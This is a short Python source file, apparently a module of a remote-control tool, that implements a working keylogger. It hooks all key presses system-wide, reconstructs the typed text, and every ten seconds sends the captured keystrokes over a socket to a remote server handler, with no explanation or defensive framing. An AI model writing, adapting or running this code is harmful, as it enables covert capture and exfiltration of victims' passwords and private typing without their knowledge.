import keyboard, time, typing, time, threading, re, string

if typing.TYPE_CHECKING:
    from ..handler import ServerHandler

def run(socketInstance: 'ServerHandler'):
    keyStrokes: str = ''

    def on_press(event) -> None:
        nonlocal keyStrokes

        match event.name:
            case 'backspace' | 'delete':
                keyStrokes = keyStrokes[:-1]

            case 'space':
                keyStrokes += ' '

            case 'tab':
                keyStrokes += '\t'

            case 'enter':
                keyStrokes += '\n'

            case _:
                if ((key := event.name) in string.printable):
                    keyStrokes += key

    def transmit_data() -> None:
        nonlocal keyStrokes

        while socketInstance.isRunningKeylogger:
            nonlocal keyStrokes

            time.sleep(10)
            socketInstance.socketInstance.send_packet('keylogger_response ' + re.sub(r'\n+', '\n', keyStrokes))
            keyStrokes = ''

    keyboard.on_press(on_press)
    threading.Thread(target = transmit_data).start()

    while socketInstance.isRunningKeylogger:
        time.sleep(1)

    keyboard.unhook_all()
